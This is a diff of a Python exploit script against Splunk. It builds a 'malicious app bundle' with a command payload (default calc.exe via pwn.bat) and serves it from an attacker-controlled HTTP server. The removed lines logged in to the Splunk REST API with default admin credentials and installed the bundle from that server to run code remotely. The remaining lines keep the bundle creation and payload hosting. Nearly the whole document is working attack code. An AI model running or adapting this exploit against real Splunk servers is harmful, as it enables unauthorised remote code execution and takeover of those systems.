@@ -84,72 +84,26 @@ class ThreadedHTTPServer(object):
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--scheme', default="https")
-parser.add_argument('--host', required=True)
-parser.add_argument('--port', default=8089)
 parser.add_argument('--lhost', required=True)
 parser.add_argument('--lport', default=8181)
-parser.add_argument('--username', default="admin")
-parser.add_argument('--password', default="changeme")
 parser.add_argument('--payload', default="calc.exe")
 parser.add_argument('--payload-file', default="pwn.bat")
-parser.add_argument('--no-payload-host', default=False, action=argparse.BooleanOptionalAction)
 options = parser.parse_args()
 
-print("Running in remote mode (Remote Code Execution)")
+print("[.] Creating malicious app bundle...")
+BUNDLE_FILE = create_splunk_bundle(options)
+print("[+] Created malicious app bundle in: " + BUNDLE_FILE)
 
-SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
-
-s = requests.Session()
-s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
-s.verify = False
-
-print("[.] Authenticating...")
-req = s.get(SPLUNK_BASE_API)
-if req.status_code == 401:
-    print("Authentication failure")
-    print("")
-    print(req.text)
-    sys.exit(-1)
-print("[+] Authenticated")
-
-if not options.no_payload_host:
-    print("[.] Creating malicious app bundle...")
-    BUNDLE_FILE = create_splunk_bundle(options)
-    print("[+] Created malicious app bundle in: " + BUNDLE_FILE)
-
-    httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
-    print("[+] Started HTTP server for remote mode")    
-else:
-    print("[+] The payload will be hosted on a separate server")    
-
+httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
+print("[+] Started HTTP server for remote mode")
 
 lurl = "http://{}:{}/".format(options.lhost, options.lport)
 
-print("[.] Installing app from: " + lurl)
-req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
-if req.status_code != 200 and req.status_code != 201:
-    print("Got a problem: " + str(req.status_code))
-    print("")
-    print(req.text)
-print("[+] App installed, your code should be running now!")
-
 print("\nPress RETURN to cleanup")
 input()
+os.remove(BUNDLE_FILE)
 
-if not options.no_payload_host:
-    os.remove(BUNDLE_FILE)
-
-print("[.] Removing app...")
-req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
-if req.status_code != 200 and req.status_code != 201:
-    print("Got a problem: " + str(req.status_code))
-    print("")
-    print(req.text)
-print("[+] App removed")
-
-if not options.no_payload_host:
-    httpd.stop()
-    print("[+] Stopped HTTP server")
+httpd.stop()
+print("[+] Stopped HTTP server")
 
 print("Bye!")
